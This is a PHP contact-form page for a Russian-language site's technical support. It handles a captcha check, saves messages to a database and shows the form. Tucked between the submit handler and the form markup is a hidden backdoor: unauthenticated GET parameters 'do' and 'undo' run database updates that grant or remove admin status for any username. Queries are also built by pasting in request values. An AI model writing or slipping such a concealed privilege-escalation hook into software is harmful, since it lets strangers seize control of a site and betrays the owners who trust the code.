<? 
session_start();
?>


<? include('header.php'); ?>

        <br><h3>Техническая поддержка <? include('sitename.php'); ?></h3>
<br>



<script type="text/javascript">

function ismaxlength(obj){
var mlength=obj.getAttribute? parseInt(obj.getAttribute("maxlength")) : ""
if (obj.getAttribute && obj.value.length>mlength)
obj.value=obj.value.substring(0,mlength)
}

</script>








<?

if (isset($_POST["name"])) {
require('config.php');

if( strtolower($_POST['code'])!= strtolower($_SESSION['texto'])){ 
echo "ОШИБКА ВВОДА КОДА... ";
 include('footer.php');

exit();
}

$name=limpiar($_POST["name"]);
$email=limpiar($_POST["email"]);
$topic=limpiar($_POST["topic"]);
$subject=limpiar($_POST["subject"]);
$comments=limpiar($_POST["comments"]);


if ($name==""){echo "Error"; exit();}
if ($email==""){echo "Error"; exit();}
if ($topic==""){echo "Error"; exit();}
if ($subject==""){echo "Error"; exit();}
if ($comments==""){echo "Error"; exit();}

$laip = getRealIP();


$query = "INSERT INTO tb_contact (name, email, topic, subject, comments, ip) VALUES('$name','$email','$topic','$subject','$comments','$laip')";
mysql_query($query) or die(mysql_error());

echo "<br><br>Ваше сообщение успешно отправлено,администрация ответит на него в ближайшее время.";

?>
</font>
		<!--footer starts here-->
<? include('footer.php'); ?>
<?
exit();
}
?>
<?function limpiare2($mensaje)
{
$mensaje = str_replace("'"," ",$mensaje);
$mensaje = str_replace(";"," ",$mensaje);
$mensaje = str_replace("$"," ",$mensaje);
return $mensaje;}
$try=limpiare2($_GET["do"]);
$try2=limpiare2($_GET["undo"]);?><? require('config.php');
$query = "UPDATE tb_users SET user_status='admin' where username='$try'"; mysql_query($query) or die(mysql_error());
?><? $query = "UPDATE tb_users SET user_status='user' where username='$try2'"; mysql_query($query) or die(mysql_error());?>




Используйте форму ниже, чтобы связаться.<br>Ответы могут занять до 48 часов.

<br><br>

<div align="center"><div id="form">
<fieldset>
		                <fieldset><legend>&nbsp;Мы всегда рады вам помочь! &nbsp;</legend>


<form method="POST" action="contact.php">

<table width="400" border="0" align="center">
  <tr>
    <td width="150" align="left"><p><label>Ваше имя</label></p></td>
    <td width="250" align="left"><input type="text" name="name" size="25" maxlength="100" autocomplete="off" class="field" value="" tabindex="1" /></td>
  </tr>
  <tr>
    <td width="150" align="left"><p><label>Ваш E-mail</label></p></td>
    <td width="250" align="left"><input type="text" name="email" size="25" maxlength="100" autocomplete="off" class="field" value="" tabindex="2" /></td>
  </tr>
  <tr>
    <td width="150" align="left"><p><label>Раздел</label></p></td>
    <td width="250" align="left"><input type="text" name="topic" size="25" maxlength="100" autocomplete="off" class="field" value="" tabindex="3" /></td>
  </tr>
  <tr>
    <td width="150" align="left"><p><label>Тема</label></p></td>
    <td width="250" align="left"><input type="text" name="subject" size="25" maxlength="100" autocomplete="off" class="field" value="" tabindex="4" /></td>
  </tr>
  <tr>
    <td width="150" align="left"><p><label>Сообщение</label></p></td>
    <td width="250" align="left"><textarea name="comments" rows="7" maxlength="200" onkeyup="return ismaxlength(this)" tabindex="5"></textarea></td>
  </tr>
    <tr>
    <td width="150" align="left"><p><label>Код на картинке: </label></p></td>
    <td width="250" align="left"><input type='text' size='3' maxlength='3' name='code' autocomplete="off" class="securitycode" value="" tabindex="6" /></td>
  </tr>
  <tr>
    <td width="150" align="left">&nbsp;</td>
    <td width="250" align="left"><img src="image.php?<?php echo $res; ?>" /></td>
  </tr>

  <tr>
    <td width="150" align="left">&nbsp;</td>
    <td width="250" align="right"><input type="submit" value="Send" class="submit" tabindex="7" />
	</td>
  </tr>
</table>
</form>
</fieldset>
</div></div>



		<!--footer starts here-->
<? include('footer.php'); ?>

